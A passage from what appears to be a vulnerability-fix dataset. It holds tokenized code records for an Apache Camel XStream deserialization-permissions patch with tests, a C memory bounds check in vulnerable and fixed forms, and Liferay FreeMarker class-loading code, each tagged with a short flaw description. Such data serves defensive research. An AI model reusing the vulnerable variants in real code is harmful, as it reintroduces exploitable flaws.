"_isComplete", ";", "if", "(", "_isComplete", ")", "new", "IllegalStateException", "(", "\"", "Multiple", "Authentications", "not", "permitted", ".", "\")", ");", "else", "_isComplete", "=", "true", ";", "private", "volatile", "boolean", "_isComplete", ";", "if", "(", "_isComplete", ")", "new", "IllegalStateException", "(", "\"", "Multiple", "Authentications", "not", "permitted", ".", "\")", ");", "else", "_isComplete", "=", "true", ";"], "docstring_tokens": ["including", "\"PLAIN", "\"", "in", "the", "\"disabledMechanisms", "\"", "attribute", "of", "the", "provider"]}
{"contents": ["empty"], "code_tokens": ["@", "XmlAttribute", "private", "String", "permissions", ";", "public", "String", "getPermissions", "(", ")", "{", "return", "permissions", ";", "}", "/", "**", "*", "Adds", "permissionsList", "*", "/", "public", "void", "setPermissions", "(", "String", "permissions", ")", "{", "this", ".", "permissions", "=", "permissions", ";", "}", "if", "(", "this", ".", "permissions", "!", "=", "null", ")", "{", "setProperty", "(", "camelContext", ",", "dataFormat", ",", "\"", "permissions", "\"", ",", "this", ".", "permissions", ")", ";", "}", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "AnyTypePermission", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "ExplicitTypePermission", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "TypePermission", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "WildcardTypePermission", ";", "private", "static", "final", "String", "PERMISSIONS_PROPERTY_KEY", "=", "\"", "org", ".", "apache", ".", "camel", ".", "xstream", ".", "permissions", "\"", ";", "private", "static", "final", "String", "PERMISSIONS_PROPERTY_DEFAULT", "=", "\"", "-*", ",", "java", ".", "lang", ".", "*,", "java", ".", "util", ".", "*\"", ";", "private", "String", "permissions", ";", "addDefaultPermissions", "(", "xstream", ")", ";", "if", "(", "this", ".", "permissions", "!", "=", "null", ")", "{", "/", "/", "permissions", ":", ":=", "pterm", "(", "',", "'", "pterm", ")", "*", "#", "consits", "of", "one", "or", "more", "terms", "/", "/", "pterm", ":", ":=", "aod", "?", "wterm", "#", "each", "term", "preceded", "by", "an", "optional", "sign", "/", "/", "aod", ":", ":=", "'", "+'", "|", "'", "-'", "#", "indicates", "allow", "or", "deny", "where", "allow", "if", "omitted", "/", "/", "wterm", ":", ":=", "a", "class", "name", "with", "optional", "wildcard", "characters", "addPermissions", "(", "xstream", ",", "permissions", ")", ";", "}", "private", "static", "void", "addPermissions", "(", "XStream", "xstream", ",", "String", "permissions", ")", "{", "for", "(", "String", "pterm", ":", "permissions", ".", "split", "(", "\",", "\")", ")", "{", "boolean", "aod", ";", "pterm", "=", "pterm", ".", "trim", "(", ");", "if", "(", "pterm", ".", "startsWith", "(", "\"-", "\")", ")", "{", "aod", "=", "false", ";", "pterm", "=", "pterm", ".", "substring", "(", "1", ")", ";", "}", "else", "{", "aod", "=", "true", ";", "if", "(", "pterm", ".", "startsWith", "(", "\"+", "\")", ")", "{", "pterm", "=", "pterm", ".", "substring", "(", "1", ")", ";", "}", "}", "TypePermission", "typePermission", "=", "null", ";", "if", "(", "\"*", "\".", "equals", "(", "pterm", ")", ")", "{", "/", "/", "accept", "or", "deny", "any", "typePermission", "=", "AnyTypePermission", ".", "ANY", ";", "}", "else", "if", "(", "pterm", ".", "indexOf", "(", "'*", "')", "<", "0", ")", "{", "/", "/", "exact", "type", "typePermission", "=", "new", "ExplicitTypePermission", "(", "new", "String", "[", "]{", "pterm", "}", ");", "}", "else", "if", "(", "pterm", ".", "length", "(", ")", ">", "0", ")", "{", "/", "/", "wildcard", "type", "typePermission", "=", "new", "WildcardTypePermission", "(", "new", "String", "[", "]{", "pterm", "}", ");", "}", "if", "(", "typePermission", "!", "=", "null", ")", "{", "if", "(", "aod", ")", "{", "xstream", ".", "addPermission", "(", "typePermission", ")", ";", "}", "else", "{", "xstream", ".", "denyPermission", "(", "typePermission", ")", ";", "}", "}", "}", "}", "private", "static", "void", "addDefaultPermissions", "(", "XStream", "xstream", ")", "{", "addPermissions", "(", "xstream", ",", "System", ".", "getProperty", "(", "PERMISSIONS_PROPERTY_KEY", ",", "PERMISSIONS_PROPERTY_DEFAULT", ")", ");", "}", "public", "String", "getPermissions", "(", ")", "{", "return", "permissions", ";", "}", "public", "void", "setPermissions", "(", "String", "permissions", ")", "{", "this", ".", "permissions", "=", "permissions", ";", "}", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "@", "BeforeClass", "public", "static", "void", "setup", "(", ")", "{", "XStreamTestUtils", ".", "setPermissionSystemProperty", "(", "\"\"", ");", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "{", "XStreamTestUtils", ".", "revertPermissionSystemProperty", "(", ");", "}", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "@", "BeforeClass", "public", "static", "void", "setup", "(", ")", "{", "XStreamTestUtils", ".", "setPermissionSystemProperty", "(", "\"\"", ");", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "{", "XStreamTestUtils", ".", "revertPermissionSystemProperty", "(", ");", "}", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "@", "BeforeClass", "public", "static", "void", "setup", "(", ")", "{", "XStreamTestUtils", ".", "setPermissionSystemProperty", "(", "\"\"", ");", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "{", "XStreamTestUtils", ".", "revertPermissionSystemProperty", "(", ");", "}", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "@", "BeforeClass", "public", "static", "void", "setup", "(", ")", "{", "XStreamTestUtils", ".", "setPermissionSystemProperty", "(", "\"\"", ");", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "{", "XStreamTestUtils", ".", "revertPermissionSystemProperty", "(", ");", "}", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "XStream", ";", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "XStreamDataFormatPermissionsSystemPropertyTest", "extends", "XStreamDataFormatPermissionsTest", "{", "@", "BeforeClass", "public", "static", "void", "setup", "(", ")", "{", "/", "/", "clear", "the", "default", "permissions", "system", "property", "/", "/", "see", "AbstractXStreamWrapper", ".", "PERMISSIONS_PROPERTY_DEFAULT", "XStreamTestUtils", ".", "setPermissionSystemProperty", "(", "\"\"", ");", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "{", "XStreamTestUtils", ".", "revertPermissionSystemProperty", "(", ");", "}", "@", "Test", "@", "Override", "public", "void", "testNone", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "Object", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "assertNotNull", "(", "po", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "178", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "XStream", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "ForbiddenClassException", ";", "import", "org", ".", "apache", ".", "camel", ".", "test", ".", "junit4", ".", "CamelTestSupport", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "XStreamDataFormatPermissionsTest", "extends", "CamelTestSupport", "{", "protected", "static", "final", "String", "XML_PURCHASE_ORDER", "=", "\"", "<", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ">", "\"", "+", "\"", "<", "name", ">", "foo", "<", "/", "name", ">", "\"", "+", "\"", "<", "price", ">", "10", ".", "0", "<", "/", "price", ">", "\"", "+", "\"", "<", "amount", ">", "1", ".", "0", "<", "/", "amount", ">", "\"", "+", "\"", "</", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ">", "\";", "protected", "static", "final", "String", "XML_PURCHASE_ORDERS_LIST", "=", "\"", "<", "list", ">", "\"", "+", "\"", "<", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ">", "\"", "+", "\"", "<", "name", ">", "foo", "<", "/", "name", ">", "\"", "+", "\"", "<", "price", ">", "10", ".", "0", "<", "/", "price", ">", "\"", "+", "\"", "<", "amount", ">", "1", ".", "0", "<", "/", "amount", ">", "\"", "+", "\"", "</", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ">", "\"", "+", "\"", "<", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ">", "\"", "+", "\"", "<", "name", ">", "bar", "<", "/", "name", ">", "\"", "+", "\"", "<", "price", ">", "9", ".", "0", "<", "/", "price", ">", "\"", "+", "\"", "<", "amount", ">", "2", ".", "0", "<", "/", "amount", ">", "\"", "+", "\"", "</", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ">", "\"", "+", "\"", "</", "list", ">", "\";", "@", "Test", "public", "void", "testNone", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "try", "{", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "fail", "(", "\"", "should", "fail", "to", "unmarshall", "\"", ");", "}", "catch", "(", "ForbiddenClassException", "e", ")", "{", "/", "/", "OK", "}", "}", "@", "Test", "public", "void", "testDeny", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"-", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", "\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "try", "{", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "fail", "(", "\"", "should", "fail", "to", "unmarshall", "\"", ");", "}", "catch", "(", "ForbiddenClassException", "e", ")", "{", "/", "/", "OK", "}", "}", "@", "Test", "public", "void", "testAllow", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", "\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "Object", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "assertNotNull", "(", "po", ")", ";", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDERS_LIST", ")", ";", "assertNotNull", "(", "po", ")", ";", "}", "@", "Test", "public", "void", "testAllowAndDeny", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", ",", "-", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "*\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "try", "{", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "fail", "(", "\"", "should", "fail", "to", "unmarshall", "\"", ");", "}", "catch", "(", "ForbiddenClassException", "e", ")", "{", "/", "/", "OK", "}", "}", "@", "Test", "public", "void", "testDenyAndAllowDeny", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"-", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "*,", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", "\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "Object", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "assertNotNull", "(", "po", ")", ";", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDERS_LIST", ")", ";", "assertNotNull", "(", "po", ")", ";", "}", "@", "Test", "public", "void", "testAllowAny", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"*", "\")", ";", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "Object", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "assertNotNull", "(", "po", ")", ";", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDERS_LIST", ")", ";", "assertNotNull", "(", "po", ")", ";", "}", "@", "Test", "public", "void", "testAllowAnyAndDeny", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"*", ",-", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", "\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "try", "{", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "fail", "(", "\"", "should", "fail", "to", "unmarshall", "\"", ");", "}", "catch", "(", "ForbiddenClassException", "e", ")", "{", "/", "/", "OK", "}", "}", "@", "Test", "public", "void", "testDenyAny", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"-", "*\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "try", "{", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "fail", "(", "\"", "should", "fail", "to", "unmarshall", "\"", ");", "}", "catch", "(", "ForbiddenClassException", "e", ")", "{", "/", "/", "OK", "}", "}", "@", "Test", "public", "void", "testDenyAnyAndAllow", "(", ")", "{", "XStreamDataFormat", "xStreamDataFormat", "=", "new", "XStreamDataFormat", "(", ");", "xStreamDataFormat", ".", "setPermissions", "(", "\"-", "*,", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", "\"", ");", "XStream", "xStream", "=", "xStreamDataFormat", ".", "createXStream", "(", "context", ".", "getClassResolver", "(", "),", "context", ".", "getApplicationContextClassLoader", "(", "))", ";", "Object", "po", "=", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDER", ")", ";", "assertNotNull", "(", "po", ")", ";", "try", "{", "xStream", ".", "fromXML", "(", "XML_PURCHASE_ORDERS_LIST", ")", ";", "fail", "(", "\"", "should", "fail", "to", "unmarshall", "\"", ");", "}", "catch", "(", "ForbiddenClassException", "e", ")", "{", "/", "/", "OK", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "46", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ";", "/", "**", "*", "*", "/", "final", "class", "XStreamTestUtils", "{", "static", "final", "String", "PERMISSIONS_PROPERTY_KEY", "=", "\"", "org", ".", "apache", ".", "camel", ".", "xstream", ".", "permissions", "\"", ";", "private", "static", "String", "oldProperty", ";", "private", "XStreamTestUtils", "(", ")", "{", "}", "public", "static", "void", "setPermissionSystemProperty", "(", "String", "value", ")", "{", "oldProperty", "=", "System", ".", "getProperty", "(", "PERMISSIONS_PROPERTY_KEY", ")", ";", "if", "(", "value", "=", "=", "null", ")", "{", "System", ".", "clearProperty", "(", "PERMISSIONS_PROPERTY_KEY", ")", ";", "}", "else", "{", "System", ".", "setProperty", "(", "PERMISSIONS_PROPERTY_KEY", ",", "value", ")", ";", "}", "}", "public", "static", "void", "revertPermissionSystemProperty", "(", ")", "{", "if", "(", "oldProperty", "=", "=", "null", ")", "{", "System", ".", "clearProperty", "(", "PERMISSIONS_PROPERTY_KEY", ")", ";", "}", "else", "{", "System", ".", "setProperty", "(", "PERMISSIONS_PROPERTY_KEY", ",", "oldProperty", ")", ";", "}", "}", "}", "@", "@", "-", "29", ",", "7", "+", "29", ",", "8", "@", "@", "<", "xstream", "id", "=", "\"", "xstream", "-", "1", "\"", "mode", "=", "\"", "NO_REFERENCES", "\"", "permissions", "=", "\"-", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "*,", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseHistory", ",", "org", ".", "apache", ".", "camel", ".", "dataformat", ".", "xstream", ".", "PurchaseOrder", "\"", ">", "com", ".", "thoughtworks", ".", "xstream", ".", "*;", "version", "=", "\"[", "1", ".", "4", ".", "7", ",", "2", ")", "\",</s>import", "org", ".", "apache", ".", "camel", ".", "impl", ".", "DefaultClassResolver", ";", "<", "xstream", "id", "=", "\"", "xstream", "-", "1", "\"", "mode", "=", "\"", "NO_REFERENCES", "\"", ">", "com", ".", "thoughtworks", ".", "xstream", ".", "*;", "version", "=", "\"[", "1", ".", "3", ",", "2", ")", "\","], "docstring_tokens": ["de-serializing", "untrusted", "data"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "iova", "<", "mem", "-", ">", "iova", "|", "|", "length", ">", "mem", "-", ">", "length", "|", "|", "iova", ">", "mem", "-", ">", "iova", "+", "mem", "-", ">", "length", "-", "length", ")", "return", "-", "EFAULT", ";", "return", "0", ";</s>return", "(", "(", "iova", "<", "mem", "-", ">", "iova", ")", "|", "|", "(", "(", "iova", "+", "length", ")", ">", "(", "mem", "-", ">", "iova", "+", "mem", "-", ">", "length", ")", "))", "?", "-", "EFAULT", ":", "0", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "write", "or", "read", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "template", ".", "TemplateManagerUtil", ";", "ClassLoader", "classLoader", "=", "hotDeployEvent", ".", "getContextClassLoader", "(", ");", "TemplateManagerUtil", ".", "destroy", "(", "classLoader", ")", ";", "PACLPolicyManager", ".", "unregister", "(", "classLoader", ")", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "lang", ".", "PortalSecurityManagerThreadLocal", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLClassLoaderUtil", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLPolicy", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLPolicyManager", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentHashMap", ";", "_classLoaderHelperUtilities", ".", "clear", "(", ");", "_classLoaderHelperUtilities", "=", "null", ";", "public", "void", "destroy", "(", "ClassLoader", "classLoader", ")", "{", "_classLoaderHelperUtilities", ".", "remove", "(", "classLoader", ")", ";", "}", "if", "(", "templateContextType", ".", "equals", "(", "TemplateContextType", ".", "CLASS_LOADER", ")", ")", "{", "/", "/", "This", "template", "will", "have", "all", "of", "its", "utilities", "initialized", "within", "/", "/", "the", "class", "loader", "of", "the", "current", "thread", "ClassLoader", "contextClassLoader", "=", "PACLClassLoaderUtil", ".", "getContextClassLoader", "(", ");", "PACLPolicy", "threadLocalPACLPolicy", "=", "PortalSecurityManagerThreadLocal", ".", "getPACLPolicy", "(", ");", "PACLPolicy", "contextClassLoaderPACLPolicy", "=", "PACLPolicyManager", ".", "getPACLPolicy", "(", "contextClassLoader", ")", ";", "try", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "contextClassLoaderPACLPolicy", ")", ";", "Map", "<", "String", ",", "Object", ">", "helperUtilities", "=", "_classLoaderHelperUtilities", ".", "get", "(", "contextClassLoader", ")", ";", "if", "(", "helperUtilities", "=", "=", "null", ")", "{", "helperUtilities", "=", "_templateContextHelper", ".", "getHelperUtilities", "(", ");", "_classLoaderHelperUtilities", ".", "put", "(", "contextClassLoader", ",", "helperUtilities", ")", ";", "}", "return", "new", "PACLFreeMarkerTemplate", "(", "templateId", ",", "templateContent", ",", "errorTemplateId", ",", "errorTemplateContent", ",", "helperUtilities", ",", "_configuration", ",", "_templateContextHelper", ",", "_stringTemplateLoader", ",", "contextClassLoaderPACLPolicy", ")", ";", "}", "finally", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "threadLocalPACLPolicy", ")", ";", "}", "}", "else", "if", "(", "templateContextType", ".", "equals", "(", "TemplateContextType", ".", "EMPTY", ")", ")", "{", "_configuration", ".", "setNewBuiltinClassResolver", "(", "new", "LiferayTemplateClassResolver", "(", "))", ";", "private", "Map", "<", "ClassLoader", ",", "Map", "<", "String", ",", "Object", ">", ">", "_classLoaderHelperUtilities", "=", "new", "ConcurrentHashMap", "<", "ClassLoader", ",", "Map", "<", "String", ",", "Object", ">", ">(", ");", "helperUtilities", ".", "put", "(", "\"", "objectUtil", "\"", ",", "new", "LiferayObjectConstructor", "(", "))", ";", "/", "**", "*", "Copyright", "(", "c", ")", "2000", "-", "2012", "Liferay", ",", "Inc", ".", "All", "rights", "reserved", ".", "*", "*", "This", "library", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "*", "the", "terms", "of", "the", "GNU", "Lesser", "General", "Public", "License", "as", "published", "by", "the", "Free", "*", "Software", "Foundation", ";", "either", "version", "2", ".", "1", "of", "the", "License", ",", "or", "(", "at", "your", "option", ")", "*", "any", "later", "version", ".", "*", "*", "This", "library", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "*", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "*", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "Lesser", "General", "Public", "License", "for", "more", "*", "details", ".", "*", "/", "package", "com", ".", "liferay", ".", "portal", ".", "freemarker", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLClassLoaderUtil", ";", "import", "freemarker", ".", "ext", ".", "beans", ".", "BeansWrapper", ";", "import", "freemarker", ".", "template", ".", "TemplateMethodModelEx", ";", "import", "freemarker", ".", "template", ".", "TemplateModelException", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "@", "author", "Raymond", "Aug", "\u00e9", "*", "/", "public", "class", "LiferayObjectConstructor", "implements", "TemplateMethodModelEx", "{", "public", "Object", "exec", "(", "@", "SuppressWarnings", "(", "\"", "rawtypes", "\"", ")", "List", "arguments", ")", "throws", "TemplateModelException", "{", "if", "(", "arguments", ".", "isEmpty", "(", "))", "{", "throw", "new", "TemplateModelException", "(", "\"", "This", "method", "must", "have", "at", "least", "one", "argument", "as", "the", "name", "of", "\"", "\"", "the", "class", "to", "instantiate", "\"", ");", "}", "Class", "<", "?>", "clazz", "=", "null", ";", "try", "{", "String", "className", "=", "String", ".", "valueOf", "(", "arguments", ".", "get", "(", "0", ")", ");", "clazz", "=", "Class", ".", "forName", "(", "className", ",", "true", ",", "PACLClassLoaderUtil", ".", "getContextClassLoader", "(", "))", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "TemplateModelException", "(", "e", ".", "getMessage", "(", "))", ";", "}", "BeansWrapper", "beansWrapper", "=", "BeansWrapper", ".", "getDefaultInstance", "(", ");", "Object", "object", "=", "beansWrapper", ".", "newInstance", "(", "clazz", ",", "arguments", ".", "subList", "(", "1", ",", "arguments", ".", "size", "(", "))", ");", "return", "beansWrapper", ".", "wrap", "(", "object", ")", ";", "}", "}", "/", "**", "*", "Copyright", "(", "c", ")", "2000", "-", "2012", "Liferay", ",", "Inc", ".", "All", "rights", "reserved", ".", "*", "*", "This", "library", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "*", "the", "terms", "of", "the", "GNU", "Lesser", "General", "Public", "License", "as", "published", "by", "the", "Free", "*", "Software", "Foundation", ";", "either", "version", "2", ".", "1", "of", "the", "License", ",", "or", "(", "at", "your", "option", ")", "*", "any", "later", "version", ".", "*", "*", "This", "library", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "*", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "*", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "Lesser", "General", "Public", "License", "for", "more", "*", "details", ".", "*", "/", "package", "com", ".", "liferay", ".", "portal", ".", "freemarker", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLClassLoaderUtil", ";", "import", "com", ".", "liferay", ".", "portal", ".", "util", ".", "PropsValues", ";", "import", "freemarker", ".", "core", ".", "Environment", ";", "import", "freemarker", ".", "core", ".", "TemplateClassResolver", ";", "import", "freemarker", ".", "template", ".", "Template", 